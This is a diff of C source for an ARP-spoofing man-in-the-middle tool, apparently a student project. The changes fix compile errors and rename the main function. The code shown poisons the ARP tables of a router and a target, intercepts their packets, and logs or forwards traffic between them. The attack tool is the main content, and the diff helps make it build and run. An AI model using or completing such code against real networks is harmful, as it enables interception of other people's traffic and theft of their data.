@@ -3,10 +3,11 @@
 #include <arp.h>
 #include <ftlibc.h>
 
-#include <netinet/if_ether.h>
-#include <signal.h>
-#include <sys/time.h>
-#include <sys/socket.h>
+# include <netinet/if_ether.h>
+# include <signal.h>
+# include <sys/time.h>
+# include <sys/socket.h>
+# include <arpa/inet.h>
 
 #define SADDRVALUETO_SADDRIN(x) (*(struct sockaddr_in *)&(x))
 
@@ -14,14 +15,14 @@ static err_t handle_incoming_arp(uint16_t protocol, in_addr_t addr, proginfo_t *
 {
     err_t st = SUCCESS;
 
-    if (ntons(protocol) == ARP_REQUEST)
+    if (ntohs(protocol) == ARP_REQUEST)
     {
         if (addr == SADDRVALUETO_SADDRIN(info->router).sin_addr.s_addr)
             st = spoof_router(info);
         else
             st = spoof_target(info);
     }
-    else if (ntons(protocol) == ARP_REPLY)
+    else if (ntohs(protocol) == ARP_REPLY)
     {
         if (SADDRVALUETO_SADDRIN(info->router).sin_addr.s_addr)
             st = spoof_target(info);
@@ -38,7 +39,7 @@ static err_t look_for_arp_packets(proginfo_t *info)
     struct ethhdr *const eth = (struct ethhdr *)buff;
     struct sockaddr src;
 
-    const ssize_t recvbytes = recvfrom(info->sockarp, buff, sizeof(buff) / sizeof(*buff), 0, &src, sizeof(src));
+    const ssize_t recvbytes = recvfrom(info->sockarp, buff, sizeof(buff) / sizeof(*buff), 0, &src, (socklen_t[]){sizeof(src)});
 
     if (recvbytes < 0)
     {
@@ -60,7 +61,7 @@ static err_t forward_packet(int sockfd, uint8_t *const packet, ssize_t packetlen
 {
     err_t st = SUCCESS;
 
-    const sentbytes = sendto(sockfd, packet, packetlen, 0, dest, sizeof(*dest));
+    const ssize_t sentbytes = sendto(sockfd, packet, packetlen, 0, dest, sizeof(*dest));
 
     if (sentbytes < 0)
     {
@@ -75,7 +76,7 @@ static err_t forward_packet(int sockfd, uint8_t *const packet, ssize_t packetlen
     return st;
 }
 
-err_t man_of_the_midle(const char *av[], const proginfo_t *const info, volatile sig_atomic_t *unpoinson)
+err_t man_in_the_middle(const char *av[], const proginfo_t *const info, volatile sig_atomic_t *unpoinson)
 {
     err_t st = SUCCESS;
     struct sockaddr sinfo;
@@ -85,7 +86,7 @@ err_t man_of_the_midle(const char *av[], const proginfo_t *const info, volatile 
     bool isstdout = false;
 
     /* Parse router's IP and MAC address, also stdout option */
-    if ((st = parse_optional_args(av, info, &isstdout)) != SUCCESS)
+    if ((st = parse_optional_args(av, (proginfo_t*)info, &isstdout)) != SUCCESS)
         goto error;
 
     /* Spoof my MAC address into router's ARP table at target's ip index*/
@@ -113,7 +114,7 @@ err_t man_of_the_midle(const char *av[], const proginfo_t *const info, volatile 
 
     for (;;)
     {
-        if ((recvbytes = recvfrom(info->sockip, buff, sizeof(buff) / sizeof(*buff), 0, &sinfo, sizeof(sinfo))) < 0)
+        if ((recvbytes = recvfrom(info->sockip, buff, sizeof(buff) / sizeof(*buff), 0, &sinfo, (socklen_t[]){sizeof(sinfo)})) < 0)
         {
             PRINT_ERROR(MSG_ERROR_SYSCALL, "recvfrom");
             st = INVSYSCALL;
@@ -125,7 +126,7 @@ err_t man_of_the_midle(const char *av[], const proginfo_t *const info, volatile 
             continue;
 
         /* Intercept and spoof any attempt of ARP */
-        if ((st = look_for_arp_packets(info)) != SUCCESS)
+        if ((st = look_for_arp_packets((proginfo_t*)info)) != SUCCESS)
             goto error;
 
         /* (filter) Log/forward only packet from target or router */
